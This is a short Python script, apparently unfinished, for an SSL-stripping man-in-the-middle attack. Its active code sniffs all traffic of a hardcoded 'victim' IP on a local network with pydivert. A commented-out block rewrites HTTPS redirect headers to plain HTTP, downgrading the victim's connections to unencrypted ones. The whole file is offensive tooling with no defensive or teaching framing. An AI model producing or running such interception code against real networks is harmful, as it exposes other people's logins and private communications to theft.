import socket
import threading
import re
import ssl
import urllib.parse
from datetime import datetime
from scapy.all import sniff, TCP, IP
import pydivert

class SSLStripper:
    def __init__(self):
        self.running = False

    def start(self):
        self.running = True
        victim_ip = "192.168.68.58"
        with pydivert.WinDivert(f"ip.SrcAddr == {victim_ip} or ip.DstAddr == {victim_ip}") as w:
            for packet in w:
                print(f"{packet.src_addr} -> {packet.dst_addr}")
        # print("[*] Starting SSL stripping...")
        # with pydivert.WinDivert(
        #     "tcp.SrcPort == 80 or tcp.DstPort == 80"  # Filter for HTTP and HTTPS traffic
        # ) as w:
        #     print("[*] Redirecting all inbound HTTP (port 80) traffic...")
        #     for packet in w:
        #         print(f"[BLOCKED] {packet.src_addr}:{packet.src_port} -> {packet.dst_addr}:{packet.dst_port}")
        #         if packet.is_inbound and packet.tcp and packet.payload:
        #             payload = packet.payload.decode(errors="ignore")
        #             # Change Location header from https to http
        #             if "Location: https://" in payload:
        #                 print("[*] Modifying Location header in HTTP response")
        #                 payload = payload.replace("Location: https://", "Location: http://")
        #                 packet.payload = payload.encode()
        #             w.send(packet)
        #         else:
        #             # Forward the packet without modification
        #             w.send(packet)
       
                                
if __name__ == "__main__":
    ssl_stripper = SSLStripper()
    try:
        ssl_stripper.start()
    except KeyboardInterrupt:
        print("\n[*] Stopping SSL stripper...")
        ssl_stripper.running = False
